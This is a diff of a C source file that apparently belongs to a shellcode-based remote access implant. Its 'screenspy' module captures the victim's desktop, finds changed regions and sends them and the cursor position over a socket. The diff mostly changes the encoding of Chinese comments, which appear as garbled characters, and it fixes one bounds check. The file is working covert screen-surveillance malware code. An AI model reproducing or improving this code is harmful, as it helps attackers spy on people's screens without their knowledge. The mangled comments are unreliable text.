@@ -2,11 +2,11 @@
 #include "shellcodes.h"
 
 /*
-  ×îĞ¡¿é´óĞ¡Îª 32 * 38
-  BitBlt ²»¼ÓÉÏ CAPTUREBLTÎŞ·¨²¶»ñÍ¸Ã÷´°Ìå
-  µ«CAPTUREBLT»áµ¼ÖÂÊó±êÉÁË¸
-  ½öÊ¹ÓÃSRCCOPY±êÖ¾Ê±£¬WindowsÖ»ĞèÒª´ÓMÖĞ¿½±´ÆÁÄ»Í¼Ïñ¾ÍĞĞÁË¡£¶øÈôÊ¹ÓÃÁËCAPTUREBLT±êÖ¾£¬µ¼ÖÂµÄ½á¹ûÊÇÊó±ê¼°°ëÍ¸Ã÷´°¿Ú¾ù±»²¶×½ÏÂÀ´¡£
-  µ«ÔÚÉè¼ÆÉÏ£¬BitBltº¯ÊıÊÇ²»ÔÊĞí²¶×½Êó±êµÄ¡£ÓÚÊÇ£¬ÏµÍ³Ö»ºÃÏÈÒş²ØÊó±ê£¬È»ºó²¶×½Í¼Ïñ£¬ÔÙ»Ö¸´Êó±ê£¬½á¹û¾Íµ¼ÖÂÁËÊó±êµÄÉÁË¸¡£
+  æœ€å°å—å¤§å°ä¸º 32 * 38
+  BitBlt ä¸åŠ ä¸Š CAPTUREBLTæ— æ³•æ•è·é€æ˜çª—ä½“
+  ä½†CAPTUREBLTä¼šå¯¼è‡´é¼ æ ‡é—ªçƒ
+  ä»…ä½¿ç”¨SRCCOPYæ ‡å¿—æ—¶ï¼ŒWindowsåªéœ€è¦ä»Mä¸­æ‹·è´å±å¹•å›¾åƒå°±è¡Œäº†ã€‚è€Œè‹¥ä½¿ç”¨äº†CAPTUREBLTæ ‡å¿—ï¼Œå¯¼è‡´çš„ç»“æœæ˜¯é¼ æ ‡åŠåŠé€æ˜çª—å£å‡è¢«æ•æ‰ä¸‹æ¥ã€‚
+  ä½†åœ¨è®¾è®¡ä¸Šï¼ŒBitBltå‡½æ•°æ˜¯ä¸å…è®¸æ•æ‰é¼ æ ‡çš„ã€‚äºæ˜¯ï¼Œç³»ç»Ÿåªå¥½å…ˆéšè—é¼ æ ‡ï¼Œç„¶åæ•æ‰å›¾åƒï¼Œå†æ¢å¤é¼ æ ‡ï¼Œç»“æœå°±å¯¼è‡´äº†é¼ æ ‡çš„é—ªçƒã€‚
 */
 
 extern void __cdecl screenspy_entry(global_data_t *global_data);
@@ -40,7 +40,7 @@ void __cdecl screenspy_entry(global_data_t *global_data) {
 
 #undef FIX  // undef macro FIX
 
-// ÇĞ»»ÊäÈë´°¿Ú
+// åˆ‡æ¢è¾“å…¥çª—å£
 bool __cdecl switch_input_desktop(global_data_t *global_data) {
   bool	ret = false;
   DWORD	needed;
@@ -96,14 +96,14 @@ void __cdecl screenspy_save_rect(global_data_t *global_data, RECT rt) {
   int nt[9];
 
   for (i = 0; i < 9; i++) {
-    //  ÕÒ³ö·Ç¿ÕÊı¾İ
+    //  æ‰¾å‡ºéç©ºæ•°æ®
     if (xscreenspy.changed[i].right == 0) continue;
 
-    // ÅĞ¶Ïµ±Ç°ÇøÓòÊÇ·ñÓëÒÑ¾­±£´æµÄÇøÓòÖĞ¼äµÄÇøÓòÊÇ·ñ×ãÒÔ·ÅÏÂÁíÍâÒ»¸ö»ù±¾¿é
+    // åˆ¤æ–­å½“å‰åŒºåŸŸæ˜¯å¦ä¸å·²ç»ä¿å­˜çš„åŒºåŸŸä¸­é—´çš„åŒºåŸŸæ˜¯å¦è¶³ä»¥æ”¾ä¸‹å¦å¤–ä¸€ä¸ªåŸºæœ¬å—
     if ((xscreenspy.changed[i].left - rt.right > 32) ||
       (rt.left - xscreenspy.changed[i].right > 32) ||
       (xscreenspy.changed[i].top - rt.bottom > 38) ||
-      (xscreenspy.changed[i].top - rt.bottom > 38)) {
+      (rt.bottom - xscreenspy.changed[i].top > 38)) {
       continue;
     }
     else {
@@ -113,7 +113,7 @@ void __cdecl screenspy_save_rect(global_data_t *global_data, RECT rt) {
     }
   }
 
-  //  ¼ÆËãÀ©³äºóµÄ´óĞ¡
+  //  è®¡ç®—æ‰©å……åçš„å¤§å°
   for (i = 0; i < 9; i++) {
     nt[i] = 0;
     if (xscreenspy.changed[i].right == 0) continue;
@@ -121,24 +121,24 @@ void __cdecl screenspy_save_rect(global_data_t *global_data, RECT rt) {
     xSetRect(&rt3, min(xscreenspy.changed[i].left, rt.left), min(xscreenspy.changed[i].top, rt.top),
       max(xscreenspy.changed[i].right, rt.right), max(xscreenspy.changed[i].bottom, rt.bottom));
 
-    //  Õâ¸ö¹«Ê½¾ÍÊÇ¼ÆËãÀ©Õ¹ºóµÄRectËùÕ¼ÓÃµÄÈßÓàÇøÓò×Ö½Ú´óĞ¡
-    //  Ğ´µ½Ò»Æğ»áµ¼ÖÂ±ÀÀ££¬wtf!
+    //  è¿™ä¸ªå…¬å¼å°±æ˜¯è®¡ç®—æ‰©å±•åçš„Rectæ‰€å ç”¨çš„å†—ä½™åŒºåŸŸå­—èŠ‚å¤§å°
+    //  å†™åˆ°ä¸€èµ·ä¼šå¯¼è‡´å´©æºƒï¼Œwtf!
     int target = (rt3.right - rt3.left) * (rt3.bottom - rt3.top);
     int orign = (xscreenspy.changed[i].right - xscreenspy.changed[i].left) * (xscreenspy.changed[i].bottom - xscreenspy.changed[i].top);
     int input = (rt.right - rt.left) * (rt.bottom - rt.top);
 
     j = (target - orign - input) * xscreenspy.bit_count / 8;
-    //  Èç¹ûÕ¼ÓÃµÄÈßÓà×Ö½ÚÊıĞ¡ÓÚ3000ÔòÖ±½ÓÉèÖÃ
+    //  å¦‚æœå ç”¨çš„å†—ä½™å­—èŠ‚æ•°å°äº3000åˆ™ç›´æ¥è®¾ç½®
     if (j < 3000) {
       xscreenspy.changed[i] = rt3;
       return;
     }
 
-    //  ±£´æÈßÓàĞÅÏ¢
+    //  ä¿å­˜å†—ä½™ä¿¡æ¯
     nt[i] = j;
   }
 
-  //  ÓĞ¿ÕÎ»ÖÃÖ±½Ó±£´æ
+  //  æœ‰ç©ºä½ç½®ç›´æ¥ä¿å­˜
   for (i = 0; i < 9; i++) {
     if (xscreenspy.changed[i].right == 0) {
       xscreenspy.changed[i] = rt;
@@ -146,7 +146,7 @@ void __cdecl screenspy_save_rect(global_data_t *global_data, RECT rt) {
     }
   }
 
-  // ÕÒ³öÀ©³äºó×Ö½ÚÊı×îĞ¡µÄÇøÓòÀ´½øĞĞÀ©³ä
+  // æ‰¾å‡ºæ‰©å……åå­—èŠ‚æ•°æœ€å°çš„åŒºåŸŸæ¥è¿›è¡Œæ‰©å……
   i = 0;
   for (j = 0; j < 9; j++) {
     if (xscreenspy.changed[i].right == 0) continue;
@@ -171,7 +171,7 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
 
   i = xscreenspy.start_line;
   while (i < xscreenspy.screen_height) {
-    //  È¡³öÒ»ĞĞÊı¾İ
+    //  å–å‡ºä¸€è¡Œæ•°æ®
     xBitBlt(xscreenspy.bitmap_line->dc, 0, 0, xscreenspy.screen_width, 1, xscreenspy.desktop_dc, 0, i, SRCCOPY/* | CAPTUREBLT*/);
 
     porign = xbitmap_scan_line(xscreenspy.bitmap_full, i);
@@ -182,7 +182,7 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
       if (*porign == *pnew) {
         porign++;
         pnew++;
-        j += 32 / xscreenspy.bit_count; // 32Î»³ıÒÔÒ»¸öÏñËØÕ¼¶àÉÙÎ»
+        j += 32 / xscreenspy.bit_count; // 32ä½é™¤ä»¥ä¸€ä¸ªåƒç´ å å¤šå°‘ä½
         continue;
       }
 
@@ -193,7 +193,7 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
 
       screenspy_save_rect(global_data, rt);
 
-      // ÕâÀï¼Óbit_countÊÇÒòÎª32(ÏñËØ) / (32(Ò»¸ödword°üº¬¶àÉÙÎ») / bitcount(Ò»¸öÏñËØÕ¼ÓÃ¶àÉÙÎ»)) = bit_count
+      // è¿™é‡ŒåŠ bit_countæ˜¯å› ä¸º32(åƒç´ ) / (32(ä¸€ä¸ªdwordåŒ…å«å¤šå°‘ä½) / bitcount(ä¸€ä¸ªåƒç´ å ç”¨å¤šå°‘ä½)) = bit_count
       porign += xscreenspy.bit_count;
       pnew += xscreenspy.bit_count;
       j += 32;
@@ -202,12 +202,12 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
     i += 19;
   }
 
-  // 0 3 6 9 12 15 18£¬ 2 5 8 11 14 17£¬ 1 4 7 10 13 16 0,
-  // ÎªÁË·ÀÖ¹Ã¿´Î¶¼´ÓµÚÒ»¸ö½øĞĞÉ¨Ãè£¬Ã¿´ÎÌø¹ıµÄĞĞÊı¶¼ÊÇÏàÍ¬µÄ£¬ÒÔÃâÌØ¶¨ĞĞÊı¸Ä±äÊ±ÎŞ·¨²¶»ñ
-  // ±£Ö¤Ã¿ĞĞ¶¼ÄÜ±»É¨Ãèµ½
+  // 0 3 6 9 12 15 18ï¼Œ 2 5 8 11 14 17ï¼Œ 1 4 7 10 13 16 0,
+  // ä¸ºäº†é˜²æ­¢æ¯æ¬¡éƒ½ä»ç¬¬ä¸€ä¸ªè¿›è¡Œæ‰«æï¼Œæ¯æ¬¡è·³è¿‡çš„è¡Œæ•°éƒ½æ˜¯ç›¸åŒçš„ï¼Œä»¥å…ç‰¹å®šè¡Œæ•°æ”¹å˜æ—¶æ— æ³•æ•è·
+  // ä¿è¯æ¯è¡Œéƒ½èƒ½è¢«æ‰«æåˆ°
   xscreenspy.start_line = (xscreenspy.start_line + 3) % 19;
 
-  // ½«±ä»¯µÄÇøÓòĞ´ÈëÔ­Í¼
+  // å°†å˜åŒ–çš„åŒºåŸŸå†™å…¥åŸå›¾
   for (i = 0; i < 9; i++) {
     if (xscreenspy.changed[i].right != 0) {
       xBitBlt(xscreenspy.bitmap_full->dc, 
@@ -218,12 +218,12 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
     }
   }
 
-  // ·¢ËÍ±ä»¯µÄÇøÓò
+  // å‘é€å˜åŒ–çš„åŒºåŸŸ
   buffer_t *buf = xbuffer_new();
   POINT pt;
   int width, height;
 
-  // Ğ´Èëµ±Ç°Êó±êÖ¸Õë
+  // å†™å…¥å½“å‰é¼ æ ‡æŒ‡é’ˆ
   xGetCursorPos(&pt);
   xbuffer_write(buf, &pt, sizeof(pt));
 
@@ -232,7 +232,7 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
       pt.x = xscreenspy.changed[i].left;
       pt.y = xscreenspy.changed[i].top;
 
-      // Ğ´ÈëÍ¼Ïñ×ø±ê
+      // å†™å…¥å›¾åƒåæ ‡
       xbuffer_write(buf, &pt, sizeof(pt));
 
       width = xscreenspy.changed[i].right - xscreenspy.changed[i].left;
@@ -256,7 +256,7 @@ int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
 }
 
 int __cdecl screenspy_send(global_data_t *global_data, SOCKET s) {
-  // ÅĞ¶ÏÊ±¼ä
+  // åˆ¤æ–­æ—¶é—´
   /*DWORD temp = xGetTickCount();
   if (temp - xscreenspy.tick < 1000 / 60) {
     return 0;
@@ -277,10 +277,10 @@ int __cdecl screenspy_send(global_data_t *global_data, SOCKET s) {
   buffer_t *buf = xbuffer_new();
   POINT pt;
 
-  // Ğ´Èëµ±Ç°Êó±êÎ»ÖÃ
+  // å†™å…¥å½“å‰é¼ æ ‡ä½ç½®
   xGetCursorPos(&pt);
   xbuffer_write(buf, &pt, sizeof(pt));
-  // Ğ´ÈëÍ¼ÏñÎ»ÖÃ
+  // å†™å…¥å›¾åƒä½ç½®
   pt.x = 0;
   pt.y = 0;
   xbuffer_write(buf, &pt, sizeof(pt));
